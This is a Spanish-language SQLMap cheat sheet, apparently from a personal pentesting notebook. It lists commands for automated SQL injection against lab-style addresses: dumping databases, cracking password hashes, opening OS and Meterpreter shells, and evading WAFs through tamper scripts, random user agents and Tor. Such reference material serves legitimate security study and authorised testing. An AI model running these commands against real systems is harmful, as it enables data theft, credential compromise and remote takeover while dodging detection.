# SQLMap — Cheat Sheet

> Inyección SQL automatizada.

---

## Sintaxis básica

```bash
sqlmap -u <URL>
sqlmap -r <request.txt>
```

## Uso básico

```bash
sqlmap -u "http://10.10.10.x/page?id=1"
sqlmap -u "http://10.10.10.x/page?id=1" --dbs
sqlmap -u "http://10.10.10.x/page?id=1" -D <db> --tables
sqlmap -u "http://10.10.10.x/page?id=1" -D <db> -T <table> --dump
```

## Desde request HTTP

```bash
# Guardar request en archivo (desde Burp)
sqlmap -r request.txt
sqlmap -r request.txt --batch
```

## Bases de datos

```bash
--dbs                              # Listar bases de datos
-D <db> --tables                   # Listar tablas
-D <db> -T <table> --columns       # Listar columnas
-D <db> -T <table> --dump          # Dump completo
-D <db> -T <table> -C <cols> --dump  # Columnas específicas
```

## Usuarios y passwords

```bash
--users                            # Listar usuarios
--passwords                        # Crackear passwords
--privileges                       # Listar privilegios
--is-dba                           # ¿Es DBA?
```

## Shell

```bash
--os-shell                         # Shell del SO
--os-pwn                           # Meterpreter
--sql-shell                        # Shell SQL
```

## Bypass de WAF

```bash
--tamper=space2comment              # Evadir WAF
--tamper=charencode                # Codificar caracteres
--random-agent                     # User-Agent aleatorio
--delay=1                          # Delay entre requests
--threads=1                        # Un hilo
```

## Opciones útiles

```bash
--batch                            # Respuestas automáticas
--level=5                          # Nivel de testing (1-5)
--risk=3                           # Riesgo (1-3)
--technique=BEUST                  # Técnicas a usar
--proxy=<proxy>                    # Proxy
--tor                              # Tor
--check-tor                       # Verificar Tor
--forms                            # Testear formularios
--crawl=3                          # Crawlear sitio
--output-dir=<dir>                 # Directorio de output
```

## Técnicas SQLi

```bash
--technique=B    # Boolean-based blind
--technique=E    # Error-based
--technique=U    # UNION query
--technique=S    # Stacked queries
--technique=T    # Time-based blind
```

## Ejemplos prácticos

```bash
# Dump completo de una BD
sqlmap -u "http://10.10.10.x/page?id=1" -D testdb --dump

# Shell
sqlmap -u "http://10.10.10.x/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://10.10.10.x/page?id=1" --tamper=space2comment --random-agent --batch

# Desde Burp request
sqlmap -r request.txt --level=5 --risk=3 --batch
```

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[SQL Injection]] — Teoría completa de SQLi
- [[Burp Suite - Framework de Auditoría]] — Capturar requests para SQLMap

> #sqlmap #herramientas #sqli #web
